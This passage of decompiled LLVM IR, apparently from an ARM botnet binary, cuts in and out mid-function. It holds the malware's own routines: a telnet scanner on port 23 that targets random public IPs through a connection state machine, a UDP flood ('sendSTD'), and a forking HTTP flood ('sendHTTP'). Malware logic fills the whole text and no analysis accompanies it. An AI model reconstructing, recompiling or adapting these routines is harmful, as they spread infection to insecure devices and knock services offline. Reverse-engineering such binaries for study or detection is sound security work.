  %v4_100038f0 = call i32 @bcopy(i32 %v2_100038cc, i32 %v2_100038e0, i32 %v3_100038d4, i32 %v2_100038dc)
  %v4_100038f4 = zext i16 %arg2 to i32
  store i32 %v4_100038f4, i32* @r3, align 4
  %v1_10003900 = call i32 @htons(i32 %v4_100038f4)
  store i32 2, i32* %stack_var_-48, align 4
  store i32 268450084, i32* @lr, align 4
  %v3_10003920 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_1000392c = ptrtoint i32* %stack_var_-32 to i32
  store i32 268450120, i32* @lr, align 4
  %v5_10003944 = call i32 @__GI_setsockopt(i32 %v3_10003920, i32 6, i32 1, i32 %v2_1000392c, i32 4)
  %v4_10003950 = icmp eq i32 %v3_10003920, -1
  br i1 %v4_10003950, label %dec_label_pc_10003958, label %dec_label_pc_10003964

dec_label_pc_10003958:                            ; preds = %dec_label_pc_100038c4
  br label %dec_label_pc_1000399c

dec_label_pc_10003964:                            ; preds = %dec_label_pc_100038c4
  store i32 268450168, i32* @lr, align 4
  %v3_10003974 = call i32 @__libc_connect(i32 %v3_10003920, i32 %v2_100038dc, i32 16)
  %v4_10003980 = icmp eq i32 %v3_10003974, -1
  br i1 %v4_10003980, label %dec_label_pc_10003988, label %dec_label_pc_10003994

dec_label_pc_10003988:                            ; preds = %dec_label_pc_10003964
  br label %dec_label_pc_1000399c

dec_label_pc_10003994:                            ; preds = %dec_label_pc_10003964
  br label %dec_label_pc_1000399c

dec_label_pc_1000399c:                            ; preds = %dec_label_pc_10003988, %dec_label_pc_10003958, %dec_label_pc_100038b8, %dec_label_pc_10003994
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_100038b8 ], [ 0, %dec_label_pc_10003958 ], [ 0, %dec_label_pc_10003988 ], [ %v3_10003920, %dec_label_pc_10003994 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %v2_100038dc, { 1, 0 }
  uselistorder i32 %v3_100038d4, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_1000399c, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-640 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100039bc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100039bc, i32* %stack_var_-640, align 4
  store i32 268450288, i32* @lr, align 4
  %v1_100039ec = call i32 @__GI_time(i32 0)
  %v0_100039f8 = call i32 @rand_cmwc()
  %v2_10003a00 = xor i32 %v1_100039ec, %v0_100039f8
  store i32 ptrtoint (i32* @global_var_10003a0c.54 to i32), i32* @lr, align 4
  %v1_10003a08 = call i32 @srand(i32 %v2_10003a00)
  store i32 2, i32* %stack_var_-60, align 4
  store i32 23, i32* @r3, align 4
  %v1_10003a18 = call i32 @htons(i32 23)
  %v2_10003a28 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10003a28, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268450372, i32* @lr, align 4
  %v0_10003a40 = call i32 @malloc()
  store i32 1025, i32* %r9.global-to-local, align 4
  store i32 268450404, i32* @lr, align 4
  %v3_10003a60 = call i32 @__GI_memset(i32 %v0_10003a40, i32 0, i32 1025)
  %v1_10003a68 = mul i32 %arg2, 28
  %v1_10003a70 = add i32 %v1_10003a68, 30
  %v1_10003a74 = and i32 %v1_10003a70, -16
  %v2_10003a7c = load i32, i32* %stack_var_-640, align 4
  %v1_10003a84 = load i32, i32* @r1, align 4
  %v3_10003a84 = sub i32 %v1_10003a84, %v1_10003a74
  %v4_10003a84 = inttoptr i32 %v3_10003a84 to i32*
  store i32 %v2_10003a7c, i32* %v4_10003a84, align 4
  %v1_10003a94 = add i32 %v3_10003a84, 23
  %v1_10003a98 = and i32 %v1_10003a94, -16
  store i32 %v1_10003a98, i32* %r9.global-to-local, align 4
  %v1_10003ab4 = mul i32 %arg2, 5
  store i32 ptrtoint (i32* @global_var_10003ac8.55 to i32), i32* @lr, align 4
  %v3_10003ac4 = call i32 @__GI_memset(i32 %v1_10003a98, i32 0, i32 %v1_10003ab4)
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_10003b6410 = icmp sgt i32 %arg2, 0
  br i1 %v2_10003b6410, label %dec_label_pc_10003ad4, label %dec_label_pc_10003b6c

dec_label_pc_10003ad4:                            ; preds = %entry, %dec_label_pc_10003ad4
  %storemerge313 = phi i32 [ %v1_10003b54, %dec_label_pc_10003ad4 ], [ 0, %entry ]
  %v1_10003adc = mul i32 %storemerge313, 28
  %v2_10003ae0 = add i32 %v1_10003adc, %v1_10003a98
  store i32 %v2_10003ae0, i32* %r9.global-to-local, align 4
  %v2_10003ae8 = inttoptr i32 %v2_10003ae0 to i32*
  store i32 0, i32* %v2_10003ae8, align 4
  %v1_10003af0 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003af0 = add i32 %v1_10003af0, 4
  %v3_10003af0 = inttoptr i32 %v2_10003af0 to i32*
  store i32 0, i32* %v3_10003af0, align 4
  %v1_10003af8 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003af8 = add i32 %v1_10003af8, 8
  %v3_10003af8 = inttoptr i32 %v2_10003af8 to i32*
  store i32 0, i32* %v3_10003af8, align 4
  %v1_10003b00 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b00 = add i32 %v1_10003b00, 12
  %v3_10003b00 = inttoptr i32 %v2_10003b00 to i32*
  store i32 0, i32* %v3_10003b00, align 4
  %v1_10003b08 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b08 = add i32 %v1_10003b08, 16
  %v3_10003b08 = inttoptr i32 %v2_10003b08 to i32*
  store i32 0, i32* %v3_10003b08, align 4
  %v1_10003b10 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b10 = add i32 %v1_10003b10, 20
  %v3_10003b10 = inttoptr i32 %v2_10003b10 to i32*
  store i32 0, i32* %v3_10003b10, align 4
  %v1_10003b18 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b18 = add i32 %v1_10003b18, 24
  %v3_10003b18 = inttoptr i32 %v2_10003b18 to i32*
  store i32 0, i32* %v3_10003b18, align 4
  %v3_10003b30 = add i32 %v2_10003ae0, 9
  %v4_10003b30 = inttoptr i32 %v3_10003b30 to i8*
  store i8 1, i8* %v4_10003b30, align 1
  %v1_10003b44 = add i32 %v2_10003ae0, 24
  %v2_10003b4c = inttoptr i32 %v1_10003b44 to i32*
  store i32 %v0_10003a40, i32* %v2_10003b4c, align 4
  %v1_10003b54 = add nuw nsw i32 %storemerge313, 1
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_10003b64 = icmp slt i32 %v1_10003b54, %arg2
  br i1 %v2_10003b64, label %dec_label_pc_10003ad4, label %dec_label_pc_10003b6c

dec_label_pc_10003b6c:                            ; preds = %dec_label_pc_10003ad4, %entry
  br label %dec_label_pc_10003b74

dec_label_pc_10003b74:                            ; preds = %dec_label_pc_10003b74, %dec_label_pc_10003b6c
  %stack_var_-604.0 = phi i32 [ 0, %dec_label_pc_10003b6c ], [ %v1_10003b78, %dec_label_pc_10003b74 ]
  %v1_10003b78 = add i32 %stack_var_-604.0, 1
  %v1_10003b8c = mul i32 %v1_10003b78, 4
  %v2_10003b90 = add i32 %v1_10003b8c, ptrtoint ([10 x i8*]* @global_var_100230fc.66 to i32)
  store i32 %v2_10003b90, i32* %r9.global-to-local, align 4
  %v1_10003b94 = inttoptr i32 %v2_10003b90 to i32*
  %v2_10003b94 = load i32, i32* %v1_10003b94, align 4
  %v3_10003b98 = icmp eq i32 %v2_10003b94, 0
  br i1 %v3_10003b98, label %dec_label_pc_10003ba0.preheader, label %dec_label_pc_10003b74

dec_label_pc_10003ba0.preheader:                  ; preds = %dec_label_pc_10003b74
  %v2_10003be8 = add i32 %v1_10003a98, 16
  %v2_10003cfc = or i32 %v1_10003a98, 4
  %v2_10003f04 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_10003ba0

dec_label_pc_10003ba0:                            ; preds = %dec_label_pc_10003ba0, %dec_label_pc_100049d0, %dec_label_pc_10003ba0.preheader
  store i32 %arg2, i32* %r9.global-to-local, align 4
  br i1 %v2_10003b6410, label %dec_label_pc_10003bac, label %dec_label_pc_10003ba0

dec_label_pc_10003bac:                            ; preds = %dec_label_pc_10003ba0, %dec_label_pc_100049d0
  %storemerge48 = phi i32 [ %v1_100049d4, %dec_label_pc_100049d0 ], [ 0, %dec_label_pc_10003ba0 ]
  %v1_10003bb4 = mul i32 %storemerge48, 28
  %v2_10003bb8 = add i32 %v1_10003bb4, %v1_10003a98
  %v1_10003bbc = add i32 %v2_10003bb8, 16
  store i32 %v1_10003bbc, i32* %r9.global-to-local, align 4
  %v1_10003bc0 = inttoptr i32 %v1_10003bbc to i32*
  %v2_10003bc0 = load i32, i32* %v1_10003bc0, align 4
  %v3_10003bc4 = icmp eq i32 %v2_10003bc0, 0
  br i1 %v3_10003bc4, label %dec_label_pc_10003bcc, label %dec_label_pc_10003bf4

dec_label_pc_10003bcc:                            ; preds = %dec_label_pc_10003bac
  store i32 268450776, i32* @lr, align 4
  %v1_10003bd4 = call i32 @__GI_time(i32 0)
  %v1_10003be4 = mul i32 %storemerge48, 28
  %v1_10003bec = add i32 %v2_10003be8, %v1_10003be4
  store i32 %v1_10003bec, i32* %r9.global-to-local, align 4
  %v2_10003bf0 = inttoptr i32 %v1_10003bec to i32*
  store i32 %v1_10003bd4, i32* %v2_10003bf0, align 4
  br label %dec_label_pc_10003bf4

dec_label_pc_10003bf4:                            ; preds = %dec_label_pc_10003bac, %dec_label_pc_10003bcc
  store i32 %v2_10003bb8, i32* %r9.global-to-local, align 4
  %v1_10003c04 = add i32 %v2_10003bb8, 8
  %v2_10003c04 = inttoptr i32 %v1_10003c04 to i8*
  %v3_10003c04 = load i8, i8* %v2_10003c04, align 4
  %v2_10003c14 = icmp ugt i8 %v3_10003c04, 7
  br i1 %v2_10003c14, label %dec_label_pc_100049d0, label %dec_label_pc_10003c1c

dec_label_pc_10003c1c:                            ; preds = %dec_label_pc_10003bf4
  %v4_10003c04 = zext i8 %v3_10003c04 to i32
  %v1_10003c20 = mul nuw nsw i32 %v4_10003c04, 4
  %v2_10003c2c = add i32 %v1_10003c20, ptrtoint (i32* @global_var_100110ec.67 to i32)
  store i32 %v2_10003c2c, i32* %r9.global-to-local, align 4
  %v1_10003c30 = inttoptr i32 %v2_10003c2c to i32*
  %v2_10003c30 = load i32, i32* %v1_10003c30, align 4
  store i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  %v2_10003c3c = add i32 %v2_10003c30, ptrtoint (i32* @global_var_100110ec.67 to i32)
  call void @__pseudo_branch(i32 %v2_10003c3c)
  store i32 %v2_10003bb8, i32* %r9.global-to-local, align 4
  %v1_10003c58 = add i32 %v2_10003bb8, 9
  %v2_10003c58 = inttoptr i32 %v1_10003c58 to i8*
  %v3_10003c58 = load i8, i8* %v2_10003c58, align 1
  %v3_10003c60 = icmp eq i8 %v3_10003c58, 1
  store i32 %v1_10003a98, i32* %r9.global-to-local, align 4
  br i1 %v3_10003c60, label %dec_label_pc_10003c68, label %dec_label_pc_10003d0c

dec_label_pc_10003c68:                            ; preds = %dec_label_pc_10003c1c
  %v1_10003c78 = add i32 %v2_10003bb8, 24
  store i32 %v1_10003c78, i32* %r9.global-to-local, align 4
  %v1_10003c7c = inttoptr i32 %v1_10003c78 to i32*
  %v2_10003c7c = load i32, i32* %v1_10003c7c, align 4
  store i32 %v2_10003bb8, i32* %r9.global-to-local, align 4
  %v2_10003c98 = inttoptr i32 %v2_10003bb8 to i32*
  store i32 0, i32* %v2_10003c98, align 4
  %v1_10003ca0 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003ca0 = add i32 %v1_10003ca0, 4
  %v3_10003ca0 = inttoptr i32 %v2_10003ca0 to i32*
  store i32 0, i32* %v3_10003ca0, align 4
  %v1_10003ca8 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003ca8 = add i32 %v1_10003ca8, 8
  %v3_10003ca8 = inttoptr i32 %v2_10003ca8 to i32*
  store i32 0, i32* %v3_10003ca8, align 4
  %v1_10003cb0 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cb0 = add i32 %v1_10003cb0, 12
  %v3_10003cb0 = inttoptr i32 %v2_10003cb0 to i32*
  store i32 0, i32* %v3_10003cb0, align 4
  %v1_10003cb8 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cb8 = add i32 %v1_10003cb8, 16
  %v3_10003cb8 = inttoptr i32 %v2_10003cb8 to i32*
  store i32 0, i32* %v3_10003cb8, align 4
  %v1_10003cc0 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cc0 = add i32 %v1_10003cc0, 20
  %v3_10003cc0 = inttoptr i32 %v2_10003cc0 to i32*
  store i32 0, i32* %v3_10003cc0, align 4
  %v1_10003cc8 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cc8 = add i32 %v1_10003cc8, 24
  %v3_10003cc8 = inttoptr i32 %v2_10003cc8 to i32*
  store i32 0, i32* %v3_10003cc8, align 4
  store i32 %v1_10003c78, i32* %r9.global-to-local, align 4
  store i32 %v2_10003c7c, i32* %v1_10003c7c, align 4
  store i32 268451056, i32* @lr, align 4
  %v1_10003cec = call i32 @GetRandomPublicIP(i32 %v1_10003c78)
  %v0_10003cf8 = load i32, i32* @r29, align 4
  %v1_10003cf8 = mul i32 %v0_10003cf8, 28
  %v1_10003d00 = add i32 %v1_10003cf8, %v2_10003cfc
  store i32 %v1_10003d00, i32* %r9.global-to-local, align 4
  %v2_10003d04 = inttoptr i32 %v1_10003d00 to i32*
  store i32 %v1_10003cec, i32* %v2_10003d04, align 4
  br label %dec_label_pc_10003e04

dec_label_pc_10003d0c:                            ; preds = %dec_label_pc_10003c1c
  store i32 %v2_10003bb8, i32* %r9.global-to-local, align 4
  %v3_10003d1c = load i8, i8* %v2_10003c58, align 1
  %v3_10003d24 = icmp eq i8 %v3_10003d1c, 0
  br i1 %v3_10003d24, label %dec_label_pc_10003d2c, label %dec_label_pc_10003e04

dec_label_pc_10003d2c:                            ; preds = %dec_label_pc_10003d0c
  store i32 %v2_10003bb8, i32* %r9.global-to-local, align 4
  %v1_10003d3c = add i32 %v2_10003bb8, 11
  %v2_10003d3c = inttoptr i32 %v1_10003d3c to i8*
  %v3_10003d3c = load i8, i8* %v2_10003d3c, align 1
  %v1_10003d44 = add i8 %v3_10003d3c, 1
  store i8 %v1_10003d44, i8* %v2_10003d3c, align 1
  store i32 %v2_10003bb8, i32* %r9.global-to-local, align 4
  %v1_10003d6c = add i32 %v2_10003bb8, 10
  %v2_10003d6c = inttoptr i32 %v1_10003d6c to i8*
  %v3_10003d6c = load i8, i8* %v2_10003d6c, align 2
  %v1_10003d74 = add i8 %v3_10003d6c, 1
  store i8 %v1_10003d74, i8* %v2_10003d6c, align 2
  store i32 %v2_10003bb8, i32* %r9.global-to-local, align 4
  %v3_10003d9c = load i8, i8* %v2_10003d3c, align 1
  %v3_10003da4 = icmp eq i8 %v3_10003d9c, 9
  store i32 %v2_10003bb8, i32* %r9.global-to-local, align 4
  br i1 %v3_10003da4, label %dec_label_pc_10003dac, label %dec_label_pc_10003dc8

dec_label_pc_10003dac:                            ; preds = %dec_label_pc_10003d2c
  store i8 1, i8* %v2_10003c58, align 1
  br label %dec_label_pc_100049d0

dec_label_pc_10003dc8:                            ; preds = %dec_label_pc_10003d2c
  %v3_10003dd8 = load i8, i8* %v2_10003d6c, align 2
  %v3_10003de0 = icmp eq i8 %v3_10003dd8, 9
  br i1 %v3_10003de0, label %dec_label_pc_10003de8, label %dec_label_pc_10003e04

dec_label_pc_10003de8:                            ; preds = %dec_label_pc_10003dc8
  store i32 %v2_10003bb8, i32* %r9.global-to-local, align 4
  store i8 1, i8* %v2_10003c58, align 1
  br label %dec_label_pc_100049d0

dec_label_pc_10003e04:                            ; preds = %dec_label_pc_10003dc8, %dec_label_pc_10003d0c, %dec_label_pc_10003c68
  store i32 2, i32* %stack_var_-60, align 4
  store i32 23, i32* @r3, align 4
  %v1_10003e10 = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-52, align 4
  %v1_10003e44 = add i32 %v2_10003bb8, 4
  store i32 %v1_10003e44, i32* %r9.global-to-local, align 4
  store i32 268451428, i32* @lr, align 4
  %v3_10003e60 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_10003e6c = mul i32 %storemerge48, 28
  %v2_10003e70 = add i32 %v1_10003e6c, %v1_10003a98
  %v2_10003e74 = inttoptr i32 %v2_10003e70 to i32*
  store i32 %v3_10003e60, i32* %v2_10003e74, align 4
  store i32 %v2_10003bb8, i32* %r9.global-to-local, align 4
  %v1_10003e88 = inttoptr i32 %v2_10003bb8 to i32*
  %v2_10003e88 = load i32, i32* %v1_10003e88, align 4
  store i32 %v2_10003e88, i32* %r9.global-to-local, align 4
  %v4_10003e90 = icmp eq i32 %v2_10003e88, -1
  br i1 %v4_10003e90, label %dec_label_pc_100049d0, label %dec_label_pc_10003e98

dec_label_pc_10003e98:                            ; preds = %dec_label_pc_10003e04
  store i32 %v2_10003bb8, i32* %r9.global-to-local, align 4
  %v2_10003ea8 = load i32, i32* %v1_10003e88, align 4
  store i32 %v2_10003bb8, i32* %r9.global-to-local, align 4
  %v2_10003ebc = load i32, i32* %v1_10003e88, align 4
  store i32 268451540, i32* @lr, align 4
  %v2_10003ed0 = call i32 @__libc_fcntl(i32 %v2_10003ebc, i32 3)
  store i32 268451568, i32* @lr, align 4
  %v2_10003eec = call i32 @__libc_fcntl(i32 %v2_10003ea8, i32 4)
  store i32 %v2_10003bb8, i32* %r9.global-to-local, align 4
  %v2_10003f00 = load i32, i32* %v1_10003e88, align 4
  store i32 %v2_10003f04, i32* %r9.global-to-local, align 4
  store i32 268451608, i32* @lr, align 4
  %v3_10003f14 = call i32 @__libc_connect(i32 %v2_10003f00, i32 %v2_10003f04, i32 16)
  store i32 %v3_10003f14, i32* %r9.global-to-local, align 4
  %v4_10003f20 = icmp eq i32 %v3_10003f14, -1
  br i1 %v4_10003f20, label %dec_label_pc_10003f28, label %dec_label_pc_10003f58

dec_label_pc_10003f28:                            ; preds = %dec_label_pc_10003e98
  %v0_10003f28 = call i32 @__errno_location()
  store i32 %v0_10003f28, i32* %r9.global-to-local, align 4
  %v1_10003f30 = inttoptr i32 %v0_10003f28 to i32*
  %v2_10003f30 = load i32, i32* %v1_10003f30, align 4
  %v3_10003f34 = icmp eq i32 %v2_10003f30, 115
  br i1 %v3_10003f34, label %dec_label_pc_10003f58, label %dec_label_pc_10003f3c

dec_label_pc_10003f3c:                            ; preds = %dec_label_pc_10003f28
  store i32 %v1_10003a98, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10003f54.68 to i32), i32* @lr, align 4
  %v2_10003f50 = call i32 @reset_telstate(i32 %v2_10003bb8, i32 %v1_10003a98)
  br label %dec_label_pc_100049d0

dec_label_pc_10003f58:                            ; preds = %dec_label_pc_10003e98, %dec_label_pc_10003f28
  store i32 %v1_10003a98, i32* %r9.global-to-local, align 4
  %v3_10003f70 = call i32 @advance_state(i32* nonnull %v1_10003e88, i32 1)
  br label %dec_label_pc_100049d0

dec_label_pc_100049d0:                            ; preds = %dec_label_pc_10003e04, %dec_label_pc_10003bf4, %dec_label_pc_10003f58, %dec_label_pc_10003f3c, %dec_label_pc_10003de8, %dec_label_pc_10003dac
  %v1_100049d4 = add nuw nsw i32 %storemerge48, 1
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_100049e4 = icmp slt i32 %v1_100049d4, %arg2
  br i1 %v2_100049e4, label %dec_label_pc_10003bac, label %dec_label_pc_10003ba0

; uselistorder directives
  uselistorder i32 %v1_100049d4, { 1, 0 }
  uselistorder i8* %v2_10003d6c, { 1, 0, 2 }
  uselistorder i8* %v2_10003d3c, { 1, 0, 2 }
  uselistorder i32 %v1_10003c78, { 1, 0, 2, 3 }
  uselistorder i8 %v3_10003c04, { 1, 0 }
  uselistorder i32 %v2_10003bb8, { 7, 8, 9, 10, 12, 11, 13, 0, 1, 2, 4, 3, 6, 5, 17, 15, 14, 16, 19, 18, 21, 20, 22 }
  uselistorder i32 %storemerge48, { 3, 1, 0, 2 }
  uselistorder i32 %v1_10003b54, { 1, 0 }
  uselistorder i32 %storemerge313, { 1, 0 }
  uselistorder i32 %v1_10003a98, { 6, 5, 4, 0, 7, 1, 3, 8, 2, 9, 10 }
  uselistorder i32* %stack_var_-60, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 33, 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 21, 22, 24, 25, 26, 27, 46, 28, 29, 30, 31, 32, 47, 34, 42, 35, 36, 37, 38, 39, 40, 41, 48, 43, 44, 45 }
  uselistorder i32 %arg2, { 4, 3, 2, 6, 5, 0, 1, 7, 8 }
  uselistorder label %dec_label_pc_100049d0, { 2, 3, 0, 4, 5, 1 }
  uselistorder label %dec_label_pc_10003f58, { 1, 0 }
  uselistorder label %dec_label_pc_10003bf4, { 1, 0 }
  uselistorder label %dec_label_pc_10003bac, { 1, 0 }
  uselistorder label %dec_label_pc_10003ba0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003ad4, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  store i32 268454432, i32* @lr, align 4
  %v3_10004a1c = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268454448, i32* @lr, align 4
  %v1_10004a2c = call i32 @__GI_time(i32 0)
  store i32 268454468, i32* @lr, align 4
  %v1_10004a40 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_10004a4c = ptrtoint i32* %stack_var_-196 to i32
  store i32 0, i32* %stack_var_-196, align 4
  store i32 0, i32* %stack_var_-192, align 4
  %v1_10004a74 = add i32 %v1_10004a40, 16
  %v2_10004a74 = inttoptr i32 %v1_10004a74 to i32*
  %v3_10004a74 = load i32, i32* %v2_10004a74, align 4
  %v1_10004a78 = inttoptr i32 %v3_10004a74 to i32*
  %v2_10004a78 = load i32, i32* %v1_10004a78, align 4
  %v2_10004a80 = ptrtoint i32* %stack_var_-192 to i32
  %v1_10004a88 = add i32 %v1_10004a40, 12
  %v2_10004a88 = inttoptr i32 %v1_10004a88 to i32*
  %v3_10004a88 = load i32, i32* %v2_10004a88, align 4
  store i32 %v3_10004a88, i32* @r5, align 4
  store i32 268454556, i32* @lr, align 4
  %v4_10004a98 = call i32 @bcopy(i32 %v2_10004a78, i32 %v2_10004a80, i32 %v3_10004a88, i32 %v1_10004a40)
  %v1_10004aa0 = add i32 %v1_10004a40, 8
  %v2_10004aa0 = inttoptr i32 %v1_10004aa0 to i32*
  %v3_10004aa0 = load i32, i32* %v2_10004aa0, align 4
  %v1_10004aa4 = urem i32 %v3_10004aa0, 65536
  store i32 %v1_10004aa4, i32* %stack_var_-196, align 4
  %v2_10004ac8 = ptrtoint i32* %stack_var_-180 to i32
  %v2_10004b18 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10004b1c = add i32 %v2_10004b18, 36
  %v2_10004b74 = add i32 %v1_10004a2c, %arg3
  br label %dec_label_pc_10004ac0

dec_label_pc_10004ac0:                            ; preds = %dec_label_pc_10004b98, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_10004b9c, %dec_label_pc_10004b98 ]
  store i32 %v2_10004ac8, i32* @r3, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_100112b0.150 to i32), i32* @r4, align 4
  store i32 144, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10004ae0.151 to i32), i32* @lr, align 4
  %v0_10004adc = call i32 @memcpy()
  store i32 268454628, i32* @lr, align 4
  %v0_10004ae0 = call i32 @random()
  %v1_10004af8 = urem i32 %v0_10004ae0, 36
  %v1_10004b14 = mul nuw nsw i32 %v1_10004af8, 4
  %v1_10004b20 = add i32 %v2_10004b1c, %v1_10004b14
  %v1_10004b24 = inttoptr i32 %v1_10004b20 to i32*
  %v2_10004b24 = load i32, i32* %v1_10004b24, align 4
  store i32 %v2_10004b24, i32* %stack_var_-216, align 4
  %tmp23 = icmp ult i32 %storemerge3, 50
  br i1 %tmp23, label %dec_label_pc_10004b98, label %dec_label_pc_10004b38

dec_label_pc_10004b38:                            ; preds = %dec_label_pc_10004ac0
  store i32 268454732, i32* @lr, align 4
  %v4_10004b48 = call i32 @__libc_send(i32 %v3_10004a1c, i32 %v2_10004b24, i32 65, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_10004b60.152 to i32), i32* @lr, align 4
  %v3_10004b5c = call i32 @__libc_connect(i32 %v3_10004a1c, i32 %v2_10004a4c, i32 16)
  store i32 268454760, i32* @lr, align 4
  %v1_10004b64 = call i32 @__GI_time(i32 0)
  %v2_10004b78 = icmp slt i32 %v1_10004b64, %v2_10004b74
  br i1 %v2_10004b78, label %dec_label_pc_10004b90, label %dec_label_pc_10004b80

dec_label_pc_10004b80:                            ; preds = %dec_label_pc_10004b38
  store i32 ptrtoint ([3 x i8]* @global_var_10004b88.153 to i32), i32* @lr, align 4
  %v1_10004b84 = call i32 @__libc_close(i32 %v3_10004a1c)
  %v1_10004b8c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10004b90

dec_label_pc_10004b90:                            ; preds = %dec_label_pc_10004b38, %dec_label_pc_10004b80
  br label %dec_label_pc_10004b98

dec_label_pc_10004b98:                            ; preds = %dec_label_pc_10004ac0, %dec_label_pc_10004b90
  %stack_var_-212.0 = phi i32 [ %storemerge3, %dec_label_pc_10004ac0 ], [ 0, %dec_label_pc_10004b90 ]
  %v1_10004b9c = add i32 %stack_var_-212.0, 1
  br label %dec_label_pc_10004ac0

; uselistorder directives
  uselistorder i32 %v3_10004a88, { 1, 0 }
  uselistorder i32 %v1_10004a40, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_10004b98, { 1, 0 }
  uselistorder label %dec_label_pc_10004b90, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-568 = alloca i32, align 4
  store i32 268454880, i32* @lr, align 4
  %v1_10004bdc = call i32 @__GI_time(i32 0)
  %v2_10004be8 = add i32 %v1_10004bdc, %arg5
  %v2_10004d288 = icmp sgt i32 %arg6, 0
  br i1 %v2_10004d288, label %dec_label_pc_10004c04.lr.ph, label %dec_label_pc_10004d30

dec_label_pc_10004c04.lr.ph:                      ; preds = %entry
  %v2_10004c50 = ptrtoint i32* %stack_var_-568 to i32
  br label %dec_label_pc_10004c04

dec_label_pc_10004c04:                            ; preds = %dec_label_pc_10004c04.lr.ph, %dec_label_pc_10004d14
  %storemerge311 = phi i32 [ 0, %dec_label_pc_10004c04.lr.ph ], [ %v1_10004d18, %dec_label_pc_10004d14 ]
  store i32 268454920, i32* @lr, align 4
  %v0_10004c04 = call i32 @random()
  %v2_10004c20 = srem i32 %v0_10004c04, 36
  %v1_10004c44 = mul nsw i32 %v2_10004c20, 4
  %v2_10004c48 = add i32 %v1_10004c44, ptrtoint ([36 x i8*]* @global_var_10023024.191 to i32)
  %v1_10004c4c = inttoptr i32 %v2_10004c48 to i32*
  %v2_10004c4c = load i32, i32* %v1_10004c4c, align 4
  store i32 %v2_10004c50, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10004c78.193 to i32), i32* @lr, align 4
  %v10_10004c74 = call i32 @sprintf(i32 %v2_10004c50, i32 ptrtoint ([64 x i8]* @global_var_10011340.192 to i32), i32 %arg1, i32 %arg4, i32 %arg2, i32 %v2_10004c4c, i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32 %v2_10004c20)
  store i32 268455036, i32* @lr, align 4
  %v0_10004c78 = call i32 @__libc_fork()
  %v3_10004c80 = icmp eq i32 %v0_10004c78, 0
  br i1 %v3_10004c80, label %dec_label_pc_10004d14, label %dec_label_pc_10004cf4.preheader

dec_label_pc_10004cf4.preheader:                  ; preds = %dec_label_pc_10004c04
  store i32 268455164, i32* @lr, align 4
  %v1_10004cf84 = call i32 @__GI_time(i32 0)
  %v2_10004d045 = icmp slt i32 %v1_10004cf84, %v2_10004be8
  br i1 %v2_10004d045, label %dec_label_pc_10004c8c, label %dec_label_pc_10004d0c

dec_label_pc_10004c8c:                            ; preds = %dec_label_pc_10004cf4.preheader, %dec_label_pc_10004cf4.backedge
  %v4_10004c9c = call i32 @socket_connect(i32 %arg2, i16 %arg3, i32 %v2_10004be8)
  %v3_10004cac = icmp eq i32 %v4_10004c9c, 0
  br i1 %v3_10004cac, label %dec_label_pc_10004cf4.backedge, label %dec_label_pc_10004cb4

dec_label_pc_10004cb4:                            ; preds = %dec_label_pc_10004c8c
  store i32 %v2_10004c50, i32* @r3, align 4
  %v0_10004cbc = call i32 @__GI_strlen()
